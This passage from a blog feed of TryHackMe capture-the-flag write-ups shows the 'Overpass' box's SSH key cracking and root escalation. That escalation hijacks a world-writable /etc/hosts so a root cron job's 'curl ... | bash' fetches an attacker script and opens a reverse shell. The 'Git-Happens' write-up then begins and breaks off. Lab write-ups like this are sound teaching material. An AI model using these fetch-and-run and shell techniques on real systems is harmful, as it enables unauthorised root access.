Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
          (key)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ive removed the password from the output but the password was cracked and I can now use that to log in. First I chmod 600 the key file so I can use it to log in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $chmod 600 key
┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $ssh -i key james@10.10.70.101
Enter passphrase for key 'key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 19 10:39:34 UTC 2020

  System load:  0.0                Processes:           88
  Usage of /:   22.4% of 18.57GB   Users logged in:     0
  Memory usage: 11%                IP address for eth0: 10.10.70.101
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Im in! I can now grab the user.txt flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
thm{65c1aaf0005
james@overpass-prod:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Now to get root, when I grabbed the user.txt file I noticed a todo.txt file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;james@overpass-prod:~$ cat todo.txt 
To Do:
&amp;gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
&amp;gt; Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
&amp;gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works
&amp;gt; Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@overpass-prod:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I will also run &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&quot;&gt;linpeas&lt;/a&gt; to see if anything jumps out.&lt;/p&gt;

&lt;p&gt;Scrolling through the output I find a cron job running every minute:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I doubt overpass.thm is a legitmate url so I checked the local host file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So as root the cronjob is downloading the build script and piping it to bash. This looks to be our path to root if I can manipulate it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;james@overpass-prod:~$ ls -lah /etc/crontab
-rw-r--r-- 1 root root 822 Jun 27 04:18 /etc/crontab
james@overpass-prod:~$ 
james@overpass-prod:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27 02:39 /etc/hosts
james@overpass-prod:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I don’t have permissions to change the cron job however I can change the hosts file and change the IP to point to my machine. I create the /downloads/src folders and a text file called buildscript.sh with the bash one liner found on &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentestmonkey&lt;/a&gt;. I started a python webserver on port 80 and a netcat listener on port 8080 and waited for the cron job to run.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.70.101] 39612
bash: cannot set terminal process group (21767): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I have root! Now to grab the flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@overpass-prod:~# cat root.txt
cat root.txt
thm{7f336f8c359
root@overpass-prod:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;the-hidden-code&quot;&gt;The hidden code&lt;/h3&gt;

&lt;p&gt;During our enumeration we were able to download a Linux binary and the source code of the password manager however they were not used to root on the machine. Lets take a look at them now.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ &lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; buildscript.sh 
&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux /usr/local/go/bin/go build &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ~/builds/overpassLinux ~/src/overpass.go
&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;windows /usr/local/go/bin/go build &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ~/builds/overpassWindows.exe ~/src/overpass.go
&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;darwin /usr/local/go/bin/go build &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ~/builds/overpassMacOS ~/src/overpass.go
&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;freebsd /usr/local/go/bin/go build &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ~/builds/overpassFreeBSD ~/src/overpass.go
&lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;openbsd /usr/local/go/bin/go build &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ~/builds/overpassOpenBSD ~/src/overpass.go
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;date &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Builds completed&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /root/buildStatus
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The build script.sh is a very simple bash script to build the binaries. So I next ran the Linux binary to see what the binary did.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]    
└──╼ $chmod +x overpassLinux                       
┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]    
└──╼ $./overpassLinux 
open /home/daz/.overpass: no such file or directory
Failed to open or read file
Continuing with new password file.
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $./overpassLinux 
open /home/daz/.overpass: no such file or directory
Failed to open or read file
Continuing with new password file.
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       2
Enter Service Name:     test
Enter new password:     testing123
┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $./overpassLinux 
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
test     testing123
┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When you run the binary you get 5 options but also an interesting message “open /home/daz/.overpass: no such file or directory” First I ran option 4 to see if any default values were included, but nothing was returned. So I then selected option 2, to set a password. Now when I ran the binary the message had gone and selecting option 4 displayed the values I had set.&lt;/p&gt;

&lt;p&gt;Next I decided to look at the source code to see what the program was doing. Not being that familiar with Go I scanned through to see what jumped out.&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;//Encrypt the credentials and write them to a file.                                 &lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;saveCredsToFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passlist&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passListEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;            
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OpenFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O_TRUNC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O_CREATE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0644&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                                             
                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                            
                &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                                  
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                                                           
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                                          
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stringToWrite&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rot47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credsToJSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                               
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WriteString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stringToWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                  
                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                            
                &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                                  
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                                                           
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Success&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                                            
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;                                                                                   
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I found the encrypt function, what jumped out was its using rot47 to encrypt the sting and is indeed saving it to a local file. When I ran linpeas I noticed a tryhackme account on the system, I wonder if that has a .overpass file in the home directory and if so can we decode it?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@overpass-prod:~# cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
james:x:1001:1001:,,,:/home/james:/bin/bash
root@overpass-prod:~# 
root@overpass-prod:~# cd /home/tryhackme
cd /home/tryhackme
root@overpass-prod:/home/tryhackme# ls -lah
ls -lah
total 7.8M
drwx------ 6 tryhackme tryhackme 4.0K Jun 27 16:13 .
drwxr-xr-x 4 root      root      4.0K Jun 27 02:20 ..
-rw-rw-r-- 1 tryhackme tryhackme    0 Jun 27 04:00 .bash_history
-rw------- 1 tryhackme tryhackme  220 Apr  4  2018 .bash_logout
-rw------- 1 tryhackme tryhackme 3.7K Apr  4  2018 .bashrc
drwx------ 3 tryhackme tryhackme 4.0K Jun 27 02:35 .cache
drwx------ 3 tryhackme tryhackme 4.0K Jun 27 02:15 .gnupg
-rw------- 1 tryhackme tryhackme   56 Jun 27 04:35 .overpass
-rw------- 1 tryhackme tryhackme  807 Apr  4  2018 .profile
drwxrwx--- 4 tryhackme tryhackme 4.0K Jun 27 02:35 go
drwx------ 6 tryhackme tryhackme 4.0K Jun 27 03:57 resources
-rwxrwxr-x 1 tryhackme tryhackme 7.8M Jun 27 03:53 server
root@overpass-prod:/home/tryhackme# cat .overpass
cat .overpass
,LQ?2&amp;gt;6QiQ%CJw24&amp;lt;|6 $F3D4C:AE:@? r@56Q[QA2DDQiQ8&amp;gt;%sJ=QN.
root@overpass-prod:/home/tryhackme#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using a online &lt;a href=&quot;https://www.dcode.fr/rot-47-cipher&quot;&gt;decoder&lt;/a&gt;, I found this by googling rot47 and its top result. Entering the rot47 string I get a result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/overpass/code.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As mentioned this code has been claimed but I wanted to show the steps on acquiring it.&lt;/p&gt;

&lt;p&gt;[{“name”:”TryHackMe Subscription Code”,”pass”:”gmTDyl”}]&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><summary type="html"></summary></entry><entry><title type="html">Git-Happens Write Up</title><link href="https://darrynbrownfield.co.uk/githappens" rel="alternate" type="text/html" title="Git-Happens Write Up" /><published>2020-09-12T00:00:00+00:00</published><updated>2020-09-12T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/githappens</id><content type="html" xml:base="https://darrynbrownfield.co.uk/githappens">&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/cover.png&quot; alt=&quot;GitHappens&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Git-Happens is an easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; with the description:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Boss wanted me to create a prototype, so here it is! We even used something called “version control” that made deploying this really easy!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We only have 1 task, find the super secret password.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.39.144’. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.39.144
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 13:07 BST
Nmap scan report for 10.10.39.144
Host is up (0.025s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.39.144:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The only port is HTTP, I browsed to the machine and found what appears to be a login page but nothing happened when I tried to log in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/WebPage.png&quot; alt=&quot;WebPage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I continued with some basic web enumeration by running Gobuster but didnt find anything.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $gobuster dir -u http://10.10.39.144 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.39.144
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/12 13:15:14 Starting gobuster
===============================================================
/css (Status: 301)
===============================================================
2020/09/12 13:17:12 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However nmap did find /.git/ so I looked at that next.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/GitPage.png&quot; alt=&quot;GitPage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to run git clone to download the files from the server but had no joy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $git clone http://10.10.39.144/
Cloning into '10.10.39.144'...
fatal: repository 'http://10.10.39.144/' not found
┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $git clone http://10.10.39.144/.git
Cloning into '10.10.39.144'...
fatal: repository 'http://10.10.39.144/.git/' not found
┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $git clone http://10.10.39.144/.git/
Cloning into '10.10.39.144'...
fatal: repository 'http://10.10.39.144/.git/' not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I did find some tools to dump the git files. However, I used wget using the -r flag to download the files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]                                                                                                                             
└──╼ $wget -r http://10.10.39.144/.git/                                                                                                                                       
--2020-09-12 13:23:22--  http://10.10.39.144/.git/                                                                                                                            
Connecting to 10.10.39.144:80... connected.                                                                                                                                   
HTTP request sent, awaiting response... 200 OK                                                                                                                                
Length: unspecified [text/html]                                                                                                                                               
Saving to: ‘10.10.39.144/.git/index.html’                                                                                                                                     
                                                                                                                                                                              
10.10.39.144/.git/index.html                     [ &amp;lt;=&amp;gt;                                                                                           ]   1.36K  --.-KB/s    in 0s 

2020-09-12 13:23:22 (146 MB/s) - ‘10.10.39.144/.git/index.html’ saved [1391]

Loading robots.txt; please ignore errors.
--2020-09-12 13:23:22--  http://10.10.39.144/robots.txt
Reusing existing connection to 10.10.39.144:80.
HTTP request sent, awaiting response... 404 Not Found
2020-09-12 13:23:22 ERROR 404: Not Found.

--2020-09-12 13:23:22--  http://10.10.39.144/ 
Reusing existing connection to 10.10.39.144:80.
HTTP request sent, awaiting response... 200 OK
Length: 6890 (6.7K) [text/html]
Saving to: ‘10.10.39.144/index.html’

10.10.39.144/index.html                      100%[==============================================================================================&amp;gt;]   6.73K  --.-KB/s    in 0s 

2020-09-12 13:23:22 (16.1 MB/s) - ‘10.10.39.144/index.html’ saved [6890/6890]

--2020-09-12 13:23:22--  http://10.10.39.144/.git/branches/
Reusing existing connection to 10.10.39.144:80.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘10.10.39.144/.git/branches/index.html’

&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I had all the files, I took a look through but nothing jumped out as a super secret password so did some research on the git commands to see how I could use the files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $ls
10.10.39.144  nmap
┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $cd 10.10.39.144/
┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
└──╼ $ls -lah
total 8.0K
drwxr-xr-x 1 daz daz   34 Sep 12 13:23 .
drwxr-xr-x 1 daz daz   32 Sep 12 13:23 ..
drwxr-xr-x 1 daz daz   18 Sep 12 13:23 css
drwxr-xr-x 1 daz daz  158 Sep 12 13:23 .git
-rw-r--r-- 1 daz daz 6.8K Jul 23 23:39 index.html
┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
└──╼ $ls -lah .git
total 24K
drwxr-xr-x 1 daz daz  158 Sep 12 13:23 .
drwxr-xr-x 1 daz daz   34 Sep 12 13:23 ..
drwxr-xr-x 1 daz daz   20 Sep 12 13:23 branches
-rw-r--r-- 1 daz daz  110 Jul 24 07:25 config
-rw-r--r-- 1 daz daz   73 Jul 23 23:39 description
-rw-r--r-- 1 daz daz   23 Jul 23 23:39 HEAD
drwxr-xr-x 1 daz daz  434 Sep 12 13:23 hooks
-rw-r--r-- 1 daz daz  645 Jul 23 23:39 index
-rw-r--r-- 1 daz daz 1.4K Sep 12 13:23 index.html
drwxr-xr-x 1 daz daz   34 Sep 12 13:23 info
drwxr-xr-x 1 daz daz   36 Sep 12 13:23 logs
